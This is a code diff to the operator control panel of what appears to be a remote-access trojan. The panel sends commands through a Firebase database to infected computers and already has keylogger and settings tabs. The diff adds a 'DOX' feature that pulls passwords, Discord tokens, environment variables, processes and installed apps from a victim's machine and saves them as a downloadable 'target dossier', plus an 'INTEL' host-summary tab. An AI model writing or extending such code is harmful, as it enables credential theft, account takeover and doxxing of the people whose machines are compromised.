@@ -132,6 +132,8 @@ body::before{content:'';position:fixed;top:-50%;left:-50%;width:200%;height:200%
     <div class="tab" data-tab="keylog">KEY</div>
     <div class="tab" data-tab="log">LOG</div>
     <div class="tab" data-tab="settings">SET</div>
+    <div class="tab" data-tab="dox" style="color:var(--red)">DOX</div>
+    <div class="tab" data-tab="intel">INTEL</div>
   </div>
 
   <div class="panel active" id="p-cmd">
@@ -361,6 +363,44 @@ body::before{content:'';position:fixed;top:-50%;left:-50%;width:200%;height:200%
       </div>
     </div>
   </div>
+
+  <div class="panel" id="p-dox">
+    <div class="bar">
+      <span class="lb" style="font-weight:600;color:var(--red)">Full Target Dossier</span>
+    </div>
+    <div style="padding:10px 12px">
+      <p style="font-size:.75rem;color:var(--txt2);margin-bottom:10px">Collects all available intel and downloads a complete dossier (.txt)</p>
+      <div style="display:grid;grid-template-columns:1fr 1fr;gap:6px;margin-bottom:12px">
+        <label style="font-size:.72rem;color:var(--txt2);display:flex;align-items:center;gap:5px"><input type="checkbox" id="doxHost" checked> Host Info</label>
+        <label style="font-size:.72rem;color:var(--txt2);display:flex;align-items:center;gap:5px"><input type="checkbox" id="doxSys" checked> System Info</label>
+        <label style="font-size:.72rem;color:var(--txt2);display:flex;align-items:center;gap:5px"><input type="checkbox" id="doxNet" checked> Network Info</label>
+        <label style="font-size:.72rem;color:var(--txt2);display:flex;align-items:center;gap:5px"><input type="checkbox" id="doxPw" checked> Passwords</label>
+        <label style="font-size:.72rem;color:var(--txt2);display:flex;align-items:center;gap:5px"><input type="checkbox" id="doxTok" checked> Discord Tokens</label>
+        <label style="font-size:.72rem;color:var(--txt2);display:flex;align-items:center;gap:5px"><input type="checkbox" id="doxEnv" checked> Environment</label>
+        <label style="font-size:.72rem;color:var(--txt2);display:flex;align-items:center;gap:5px"><input type="checkbox" id="doxProc" checked> Processes</label>
+        <label style="font-size:.72rem;color:var(--txt2);display:flex;align-items:center;gap:5px"><input type="checkbox" id="doxSvc" checked> Services</label>
+        <label style="font-size:.72rem;color:var(--txt2);display:flex;align-items:center;gap:5px"><input type="checkbox" id="doxApps" checked> Installed Apps</label>
+        <label style="font-size:.72rem;color:var(--txt2);display:flex;align-items:center;gap:5px"><input type="checkbox" id="doxClip"> Clipboard</label>
+      </div>
+      <div class="bar" style="gap:6px">
+        <button class="btn btn-d" id="doxBtn" onclick="runDox()">Generate Dossier</button>
+        <span id="doxStatus" style="font-size:.72rem;color:var(--txt2)"></span>
+      </div>
+      <div id="doxProgress" style="margin-top:8px;display:none">
+        <div style="background:rgba(255,255,255,.06);border-radius:4px;height:6px;overflow:hidden;margin-bottom:6px"><div id="doxBar" style="background:var(--red);height:100%;width:0%;transition:width .3s;border-radius:4px"></div></div>
+        <div id="doxLog" style="font-size:.7rem;color:var(--txt2);max-height:150px;overflow-y:auto"></div>
+      </div>
+    </div>
+  </div>
+
+  <div class="panel" id="p-intel">
+    <div class="bar">
+      <span class="lb" style="font-weight:600;color:var(--acc)">Quick Intel</span>
+      <button class="btn btn-a btn-sm" onclick="loadIntel()">Refresh</button>
+    </div>
+    <div id="intelOut" style="padding:8px 12px"><div class="loading">Loading intel...</div></div>
+    <div id="intelErr" class="err"></div>
+  </div>
 </div>
 
 <script>
@@ -389,6 +429,7 @@ function switchTab(name){
   if(name==='files'&&!g_fp)browseDir('');
   if(name==='proc')loadProc();
   if(name==='settings')loadSettings();
+  if(name==='intel')loadIntel();
 }
 
 document.addEventListener('keydown',e=>{
@@ -405,19 +446,19 @@ document.addEventListener('keydown',e=>{
 let g_fe=null;
 async function saw(type,payload,el,errId){
   const ee=document.getElementById(errId);if(ee)ee.style.display='none';
-  el.innerHTML='<div class="loading"><span class="sp"></span>Sending...</div>';
+  if(el)el.innerHTML='<div class="loading"><span class="sp"></span>Sending...</div>';
   const id='c'+Date.now().toString(36)+Math.random().toString(36).slice(2,10);
   const base=FB+'/commands/'+fbEsc(computer);
   try{
     const r=await fetch(base+'/'+id+'.json',{method:'PUT',headers:{'Content-Type':'application/json'},body:JSON.stringify({computer,type,payload:payload||'',status:'pending'})});
-    if(!r.ok){el.innerHTML='<div class="loading">HTTP '+r.status+'</div>';if(ee){ee.textContent='Server '+r.status;ee.style.display='block'}return null}
-    el.innerHTML='<div class="loading"><span class="sp"></span>Waiting...</div>';
+    if(!r.ok){if(el)el.innerHTML='<div class="loading">HTTP '+r.status+'</div>';if(ee){ee.textContent='Server '+r.status;ee.style.display='block'}return null}
+    if(el)el.innerHTML='<div class="loading"><span class="sp"></span>Waiting...</div>';
     for(let i=0;i<50;i++){
       if(i)await new Promise(r=>setTimeout(r,100));
       try{const r2=await fetch(base+'.json?_='+Date.now(),{cache:'no-store'});if(!r2.ok)continue;const all=await r2.json();if(all&&all[id]&&all[id].status==='done'){const row=all[id];fetch(base+'/'+id+'.json',{method:'DELETE'}).catch(()=>{});return row}}catch{}
     }
-    el.innerHTML='<div class="loading">Timeout</div>';if(ee){ee.textContent='No response';ee.style.display='block'}return null
-  }catch(e){el.innerHTML='<div class="loading">Error</div>';if(ee){ee.textContent=e.message||'err';ee.style.display='block'}return null}
+    if(el)el.innerHTML='<div class="loading">Timeout</div>';if(ee){ee.textContent='No response';ee.style.display='block'}return null
+  }catch(e){if(el)el.innerHTML='<div class="loading">Error</div>';if(ee){ee.textContent=e.message||'err';ee.style.display='block'}return null}
 }
 
 function fbEsc(s){return String(s).replace(/[\/\.\#\$\[\]]/g,'_')}
@@ -577,6 +618,113 @@ async function uninstallClient(){
 async function setLiveMon(){const m=document.getElementById('setLiveMon').value;await saw('live_monitor',m,'setErr','setErr')}
 async function setLiveQ(){const q=document.getElementById('setQuality').value;await saw('live_config',JSON.stringify({quality:parseInt(q)}),'setErr','setErr')}
 async function setLiveS(){const s=document.getElementById('setScale').value;await saw('live_config',JSON.stringify({scale:parseFloat(s)}),'setErr','setErr')}
+
+// === DOX ===
+const doxTasks=[
+  {id:'doxHost',type:'host_info',label:'Host Info'},
+  {id:'doxSys',type:'system_info',label:'System Info'},
+  {id:'doxNet',type:'network_info',label:'Network Info'},
+  {id:'doxPw',type:'passwords',label:'Passwords'},
+  {id:'doxTok',type:'discord_tokens',label:'Discord Tokens'},
+  {id:'doxEnv',type:'env_vars',label:'Environment Variables'},
+  {id:'doxProc',type:'process_list',label:'Processes'},
+  {id:'doxSvc',type:'services',label:'Services'},
+  {id:'doxApps',type:'installed_apps',label:'Installed Apps'},
+  {id:'doxClip',type:'clipboard',label:'Clipboard'},
+];
+async function runDox(){
+  const btn=document.getElementById('doxBtn');btn.disabled=true;btn.textContent='Collecting...';
+  const prog=document.getElementById('doxProgress');prog.style.display='';
+  const bar=document.getElementById('doxBar');const log=document.getElementById('doxLog');const st=document.getElementById('doxStatus');
+  log.innerHTML='';bar.style.width='0%';
+  const selected=doxTasks.filter(t=>document.getElementById(t.id).checked);
+  let results={};let done=0;
+  const ts=new Date().toISOString().replace(/[:.]/g,'-');
+  log.innerHTML+='<div style="color:var(--acc)">Starting dossier collection for '+esc(computer)+'...</div>';
+  for(const task of selected){
+    done++;bar.style.width=Math.round(done/selected.length*100)+'%';
+    st.textContent=task.label+'...';
+    log.innerHTML+='<div style="color:var(--txt2)">├ '+esc(task.label)+': requesting...</div>';
+    log.scrollTop=log.scrollHeight;
+    try{
+      const r=await saw(task.type,'',null,null);
+      if(r&&r.result){
+        results[task.label]=r.result;
+        log.innerHTML+='<div style="color:var(--grn)">├ '+esc(task.label)+': OK ('+r.result.length+' chars)</div>';
+      }else{
+        results[task.label]='(no data)';
+        log.innerHTML+='<div style="color:var(--ylw)">├ '+esc(task.label)+': empty</div>';
+      }
+    }catch(e){
+      results[task.label]='(error)';
+      log.innerHTML+='<div style="color:var(--red)">├ '+esc(task.label)+': error</div>';
+    }
+    log.scrollTop=log.scrollHeight;
+  }
+  bar.style.width='100%';
+  log.innerHTML+='<div style="color:var(--grn);margin-top:4px">Done! Generating file...</div>';
+  let txt='';
+  txt+='═══════════════════════════════════════════════════════\n';
+  txt+='  TARGET DOSSIER: '+computer+'\n';
+  txt+='  Generated: '+new Date().toLocaleString()+'\n';
+  txt+='  IP: '+(document.getElementById('meta')?.textContent||'')+'\n';
+  txt+='═══════════════════════════════════════════════════════\n\n';
+  for(const[key,val]of Object.entries(results)){
+    txt+='┌─────────────────────────────────────────────────────┐\n';
+    txt+='│ '+key.toUpperCase().padEnd(51)+'│\n';
+    txt+='├─────────────────────────────────────────────────────┤\n';
+    const lines=(val||'').split('\n');
+    for(const line of lines){txt+='│ '+line.substring(0,51).padEnd(51)+'│\n';}
+    txt+='└─────────────────────────────────────────────────────┘\n\n';
+  }
+  txt+='═══════════════════════════════════════════════════════\n';
+  txt+='  END OF DOSSIER\n';
+  txt+='═══════════════════════════════════════════════════════\n';
+  const blob=new Blob([txt],{type:'text/plain'});
+  const a=document.createElement('a');a.href=URL.createObjectURL(blob);
+  a.download='DOX_'+computer+'_'+ts+'.txt';
+  a.click();URL.revokeObjectURL(a.href);
+  st.textContent='Downloaded!';
+  log.innerHTML+='<div style="color:var(--grn)">✓ Dossier downloaded: DOX_'+esc(computer)+'_'+esc(ts)+'.txt</div>';
+  btn.disabled=false;btn.textContent='Generate Dossier';
+  toast('Dossier downloaded');
+}
+
+// === INTEL ===
+async function loadIntel(){
+  const el=document.getElementById('intelOut');const ee=document.getElementById('intelErr');ee.style.display='none';
+  el.innerHTML='<div class="loading"><span class="sp"></span>Gathering intel...</div>';
+  let html='';
+  try{
+    const r=await saw('host_info','',null,null);
+    if(r&&r.result){
+      const d=JSON.parse(r.result);
+      html+='<div style="display:grid;grid-template-columns:1fr 1fr;gap:6px;margin-bottom:8px">';
+      html+='<div style="background:rgba(255,255,255,.03);padding:6px 8px;border-radius:6px"><div style="font-size:.65rem;color:var(--txt2)">HOSTNAME</div><div style="font-size:.85rem;color:var(--acc);font-weight:600">'+esc(d.host||'?')+'</div></div>';
+      html+='<div style="background:rgba(255,255,255,.03);padding:6px 8px;border-radius:6px"><div style="font-size:.65rem;color:var(--txt2)">USER</div><div style="font-size:.85rem;color:var(--acc);font-weight:600">'+esc(d.user||'?')+'</div></div>';
+      html+='<div style="background:rgba(255,255,255,.03);padding:6px 8px;border-radius:6px"><div style="font-size:.65rem;color:var(--txt2)">OS</div><div style="font-size:.85rem;color:#f0f4fc">'+esc(d.os||'?')+'</div></div>';
+      html+='<div style="background:rgba(255,255,255,.03);padding:6px 8px;border-radius:6px"><div style="font-size:.65rem;color:var(--txt2)">ARCH</div><div style="font-size:.85rem;color:#f0f4fc">'+esc(d.arch||'?')+'</div></div>';
+      html+='<div style="background:rgba(255,255,255,.03);padding:6px 8px;border-radius:6px"><div style="font-size:.65rem;color:var(--txt2)">CPU</div><div style="font-size:.85rem;color:#f0f4fc">'+(d.cores||'?')+' cores</div></div>';
+      html+='<div style="background:rgba(255,255,255,.03);padding:6px 8px;border-radius:6px"><div style="font-size:.65rem;color:var(--txt2)">RAM</div><div style="font-size:.85rem;color:#f0f4fc">'+(d.ram/1024).toFixed(1)+' GB</div></div>';
+      html+='<div style="background:rgba(255,255,255,.03);padding:6px 8px;border-radius:6px"><div style="font-size:.65rem;color:var(--txt2)">GPU</div><div style="font-size:.85rem;color:#f0f4fc">'+esc(d.gpus||'?')+'</div></div>';
+      html+='<div style="background:rgba(255,255,255,.03);padding:6px 8px;border-radius:6px"><div style="font-size:.65rem;color:var(--txt2)">UPTIME</div><div style="font-size:.85rem;color:#f0f4fc">'+Math.floor(d.uptime/3600)+'h '+Math.floor((d.uptime%3600)/60)+'m</div></div>';
+      html+='</div>';
+      if(d.disks&&d.disks.length){
+        html+='<div style="margin-bottom:8px">';
+        for(const dk of d.disks){
+          const pct=dk.t>0?((dk.t-dk.f)/dk.t*100).toFixed(0):0;
+          html+='<div style="display:flex;align-items:center;gap:8px;margin-bottom:4px;font-size:.75rem">';
+          html+='<span style="color:var(--txt2);min-width:30px">'+dk.d+'</span>';
+          html+='<div style="flex:1;background:rgba(255,255,255,.06);border-radius:3px;height:5px;overflow:hidden"><div style="width:'+pct+'%;height:100%;background:'+(pct>90?'var(--red)':'var(--grn)')+';border-radius:3px"></div></div>';
+          html+='<span style="color:var(--txt2);min-width:80px;text-align:right">'+dk.f.toFixed(1)+' / '+dk.t+' GB</span>';
+          html+='</div>';
+        }
+        html+='</div>';
+      }
+      el.innerHTML=html;
+    }else{el.innerHTML='<div class="loading">No host data</div>'}
+  }catch(e){el.innerHTML='<div class="loading">Error loading intel</div>'}
+}
 
 // === Util ===
 function toast(m){const t=document.createElement('div');t.className='toast';t.textContent='✓ '+m;document.body.appendChild(t);setTimeout(()=>t.remove(),1800)}
